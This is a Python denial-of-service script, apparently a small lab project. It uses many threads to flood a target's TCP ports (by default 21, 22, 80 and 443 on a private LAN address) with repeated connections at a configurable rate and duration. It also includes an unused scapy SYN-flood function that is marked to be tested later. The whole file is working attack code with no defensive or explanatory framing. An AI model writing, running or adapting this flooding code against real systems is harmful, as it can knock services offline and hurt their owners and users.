import socket
import time
import random
import argparse
import threading
from scapy.all import IP, TCP, Raw, send, RandShort



class DoS:
    def __init__(self, target_ip, ports, mode, requestsPerSecond, concurrency):
        self.target_ip = target_ip
        self.ports = ports
        self.mode = mode
        self.requestsPerSecond = requestsPerSecond
        self.concurrency = concurrency
        self.stop = threading.Event()


    def connect(self, port):

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.target_ip, port))
            try:
                s.send(b'X')
            except Exception:
                pass
            s.close()
        except Exception:
            pass


    def connect_loop(self):
        interval = 0.0
        if self.requestsPerSecond > 0:
            interval = 1.0 / self.requestsPerSecond

        while not self.stop.is_set():
            self.connect(random.choice(self.ports))

            if interval:
                time.sleep(interval)

    # test later
    def syn_flood(self, port, count):
        ip = IP(dst = self.target_ip)
        tcp = TCP(sport = RandShort(), dport = port, flags = "S")
        raw = Raw(b"X"*1024)
        p = ip / tcp / raw
        send(p, count=count, verbose = 0)



    def run(self, duration):
        print(f"mode={self.mode} target={self.target_ip} ports={self.ports} requestsPerSecond={self.requestsPerSecond} concurrency={self.concurrency} duration={duration}s")
        threads = []

        for _ in range(self.concurrency):
            t = threading.Thread(target=self.connect_loop, daemon=True)
            threads.append(t)
            t.start()
        end = time.time() + duration

        try:
            while time.time() < end:
                time.sleep(0.2)
        except KeyboardInterrupt:
            pass

        self.stop.set()

        for t in threads:
            t.join(timeout=2.0)
        print("done")


def parse_ports(s):
    return [int(x) for x in s.split(",") if x.strip()]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="192.168.1.65")
    ap.add_argument("--ports", default="21,22,80,443")
    ap.add_argument("--mode", choices=["connection"], default="connection")
    ap.add_argument("--requestsPerSecond", type=float, default=10.0)
    ap.add_argument("--concurrency", type=int, default=10)
    ap.add_argument("--duration", type=int, default=15)
    args = ap.parse_args()
    dos = DoS(args.target, parse_ports(args.ports), args.mode, args.requestsPerSecond, args.concurrency)
    dos.run(args.duration)




if __name__ == "__main__":
    main()
